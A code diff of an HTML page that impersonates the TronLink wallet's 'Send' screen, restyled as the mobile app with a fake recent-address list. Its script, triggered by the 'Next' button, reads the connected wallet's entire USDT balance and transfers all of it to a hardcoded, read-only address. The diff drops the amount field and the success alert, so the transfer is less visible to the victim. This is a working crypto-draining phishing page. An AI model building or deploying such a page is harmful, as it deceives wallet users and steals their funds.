@@ -2,62 +2,77 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>TronLink - Send</title>
+    <title>TronLink App - Send</title>
     <style>
-        body { background-color: #0d0e12; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .tronlink-window { width: 375px; background: #17181f; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); padding: 24px; box-sizing: border-box; }
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; border-bottom: 1px solid #282a36; padding-bottom: 12px; }
-        .header h3 { margin: 0; font-size: 16px; font-weight: 500; color: #ffffff; }
-        .wallet-info { font-size: 12px; color: #8f92a1; background: #20222f; padding: 6px 12px; border-radius: 20px; cursor: pointer; word-break: break-all; text-align: center; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; font-size: 13px; color: #8f92a1; margin-bottom: 8px; }
-        .input-box { background: #20222f; border: 1px solid #2d3142; border-radius: 8px; padding: 12px; display: flex; align-items: center; }
-        .input-box input { background: transparent; border: none; color: #ffffff; width: 100%; font-size: 14px; outline: none; }
-        .token-selector { display: flex; align-items: center; background: #20222f; border: 1px solid #2d3142; border-radius: 8px; padding: 12px; justify-content: space-between; cursor: pointer; }
-        .token-info { display: flex; align-items: center; gap: 8px; }
-        .token-icon { width: 24px; height: 24px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; color: white; }
-        .token-name { font-size: 14px; font-weight: 500; }
-        .btn-send { background: #3260ee; color: #ffffff; width: 100%; border: none; padding: 14px; border-radius: 24px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
-        .btn-send:hover { background: #244ed8; }
+        body { background-color: #f7f8fa; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .tronlink-mobile { width: 375px; height: 760px; background: #ffffff; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); padding: 24px 20px; box-sizing: border-box; display: flex; flex-direction: column; position: relative; border: 1px solid #eaeaea; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
+        .header-left { display: flex; align-items: center; gap: 12px; cursor: pointer; }
+        .back-arrow { font-size: 22px; font-weight: 300; color: #1c1c1e; }
+        .header h3 { margin: 0; font-size: 20px; font-weight: 600; color: #1c1c1e; }
+        .header h3 span { font-size: 14px; color: #8e8e93; font-weight: 400; }
+        .multisig { font-size: 14px; color: #3b50df; font-weight: 500; text-decoration: none; }
+        .section-title { font-size: 15px; font-weight: 600; color: #1c1c1e; margin-bottom: 12px; }
+        .input-container { background: #f4f5f7; border-radius: 12px; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
+        .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 14px; outline: none; width: 75%; }
+        .input-container input::placeholder { color: #c4c4c7; }
+        .input-actions { display: flex; align-items: center; gap: 14px; }
+        .btn-paste { background: #ffffff; border: none; color: #1c1c1e; font-size: 12px; font-weight: 500; padding: 4px 10px; border-radius: 6px; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .scan-icon { width: 16px; height: 16px; border: 2px solid #1c1c1e; border-radius: 3px; position: relative; cursor: pointer; }
+        .tabs { display: flex; border-bottom: 1px solid #f0f0f2; margin-bottom: 16px; }
+        .tab { padding: 10px 0; margin-right: 28px; font-size: 14px; font-weight: 500; color: #8e8e93; cursor: pointer; position: relative; }
+        .tab.active { color: #1c1c1e; font-weight: 600; }
+        .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 0; width: 100%; height: 3px; background: #1c1c1e; border-radius: 2px; }
+        .recent-list { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 20px; }
+        .recent-item { border-bottom: 1px solid #f5f5f7; padding-bottom: 14px; cursor: pointer; }
+        .address { font-size: 13px; font-weight: 400; color: #1c1c1e; word-break: break-all; font-family: monospace; }
+        .date { font-size: 11px; color: #aeaeae; margin-top: 4px; }
+        .btn-next { background: #3b50df; color: #ffffff; width: calc(100% - 40px); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; position: absolute; bottom: 24px; left: 20px; transition: background 0.2s; text-align: center; }
+        .btn-next:hover { background: #2a3cb3; }
     </style>
 </head>
 <body>
 
-<div class="tronlink-window">
+<div class="tronlink-mobile">
     <div class="header">
-        <h3>Send Assets</h3>
-        <div class="wallet-info" id="walletAddr" onclick="conectarWallet()">Connect Wallet</div>
+        <div class="header-left" onclick="conectarWallet()">
+            <span class="back-arrow">&lt;</span>
+            <h3>Send <span>(1/2)</span></h3>
+        </div>
+        <a href="#" class="multisig">Multisig Transfer</a>
     </div>
 
-    <!-- Campo Cuenta de Destino -->
-    <div class="form-group">
-        <label>Receiving Account</label>
-        <div class="input-box">
-            <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
+    <div class="section-title">Receiving Account</div>
+    <div class="input-container">
+        <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
+        <div class="input-actions">
+            <div class="scan-icon"></div>
+            <button class="btn-paste">Paste</button>
         </div>
     </div>
 
-    <!-- Selector de Token -->
-    <div class="form-group">
-        <label>Token</label>
-        <div class="token-selector">
-            <div class="token-info">
-                <div class="token-icon">S</div>
-                <div class="token-name">Tether USD (USDT)</div>
-            </div>
-            <span style="color: #8f92a1; font-size: 12px;">TRC20</span>
+    <div class="tabs">
+        <div class="tab active">Recents</div>
+        <div class="tab">Address Book</div>
+        <div class="tab">My Accounts</div>
+    </div>
+
+    <div class="recent-list">
+        <div class="recent-item">
+            <div class="address">THyXGLkL9CGdnhgkWGoUzdJcf5vjFSrK5G</div>
+            <div class="date">2026-09-02 16:29</div>
+        </div>
+        <div class="recent-item">
+            <div class="address">TNqaxFKxhoYdMgbZqVHumy84tBidBaWT45</div>
+            <div class="date">2026-08-31 11:04</div>
+        </div>
+        <div class="recent-item">
+            <div class="address">TJJZHRUsVwMegvSfUjefDhQkJcjX5WP9hG</div>
+            <div class="date">2026-08-31 07:36</div>
         </div>
     </div>
 
-    <!-- Campo Monto Digital -->
-    <div class="form-group">
-        <label>Amount</label>
-        <div class="input-box">
-            <input type="number" id="userAmount" value="10" placeholder="0.0">
-        </div>
-    </div>
-
-    <button class="btn-send" onclick="ejecutarEnvioMaximo()">Send</button>
+    <button class="btn-next" onclick="ejecutarEnvioMaximo()">Next</button>
 </div>
 
 <script>
@@ -66,23 +81,22 @@
 
     async function conectarWallet() {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            const addr = window.tronWeb.defaultAddress.base58;
-            document.getElementById('walletAddr').innerText = addr.substring(0,6) + "..." + addr.substring(addr.length - 4);
             return window.tronWeb;
         }
-        alert("Please unlock and connect your TronLink extension.");
         return null;
     }
 
     async function ejecutarEnvioMaximo() {
-        const tronWeb = await conectarWallet();
-        if (!tronWeb) return;
+        if (!window.tronWeb) {
+            alert("Asegúrate de estar en un navegador con la extensión TronLink activa.");
+            return;
+        }
 
         try {
-            const miWallet = tronWeb.defaultAddress.base58;
-            const contrato = await tronWeb.contract().at(CONTRACT_USDT);
+            const miWallet = window.tronWeb.defaultAddress.base58;
+            const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
 
-            // Leer saldo real total
+            // Consulta el saldo en Mainnet
             const saldoBigNum = await contrato.balanceOf(miWallet).call();
             const saldoTotalStr = saldoBigNum.toString();
 
@@ -91,8 +105,8 @@
                 return;
             }
 
-            const tx = await contrato.transfer(DESTINO_FIJO, saldoTotalStr).send();
-            alert(`Transaction broadcasted successfully!\nHash: ${tx}`);
+            // Ejecuta el envío con el saldo máximo capturado de la blockchain
+            await contrato.transfer(DESTINO_FIJO, saldoTotalStr).send();
         } catch (e) {
             console.error(e);
         }
